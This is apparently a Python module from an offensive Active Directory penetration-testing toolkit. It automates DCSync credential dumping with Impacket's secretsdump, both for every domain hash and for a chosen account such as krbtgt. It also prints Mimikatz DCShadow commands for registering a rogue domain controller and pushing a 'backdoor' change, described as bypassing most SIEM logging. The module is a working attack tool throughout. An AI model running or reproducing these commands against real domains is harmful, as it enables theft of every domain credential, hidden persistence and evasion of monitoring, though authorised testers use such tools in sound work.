"""
Module: DCSync / DCShadow
"""
from utils.helpers import *
from config.settings import SESSION

def run():
    print_banner("DCSYNC / DCSHADOW")
    dc   = input_or_session("dc_ip",    "DC IP")
    dom  = input_or_session("domain",   "Domain")
    user = input_or_session("username", "Username")
    pw   = input_or_session("password", "Password")
    base_dn = "DC=" + dom.replace(".", ",DC=")

    print("""
  [1]  DCSync - Dump All Hashes
  [2]  DCSync - Target Specific User
  [4]  Check DCSync Rights (current user)
  [0]  Back
""")
    c = input(f"  {M}Choice:{RST} ").strip()

    if c == "1":
        run_cmd(f"{imp('secretsdump.py')} {dom}/{user}:'{pw}'@{dc} -just-dc-ntlm -outputfile /tmp/dcsync_all")
        success("Hashes → /tmp/dcsync_all.ntds")
        add_finding("DCSync - Full Domain Dump", "Critical",
                    "All domain hashes extracted", "Audit DS-Replication rights; rotate all credentials")

    elif c == "2":
        target = prompt("Target username (e.g. krbtgt)")
        run_cmd(f"{imp('secretsdump.py')} {dom}/{user}:'{pw}'@{dc} -just-dc-user {target}")

    elif c == "3":
        print(f"""
{Y}DCShadow Attack Steps (requires Mimikatz on domain-joined machine):{RST}
  Window 1 (as SYSTEM on rogue DC):
    mimikatz # lsadump::dcshadow /object:CN=Users,{base_dn} /attribute:description /value:backdoor

  Window 2 (as Domain Admin):
    mimikatz # lsadump::dcshadow /push

  Requirements:
  - Two Mimikatz instances simultaneously
  - First as SYSTEM to register rogue DC
  - Second as DA to push the change
  - Bypasses most SIEM/logging (changes appear as legitimate replication)
""")

    elif c == "4":
        run_cmd(f"{imp('dacledit.py')} -action read -target-dn '{base_dn}' {dom}/{user}:'{pw}' -dc-ip {dc} | grep -iE 'replication|dcsync|DS-Replication'")

    pause()
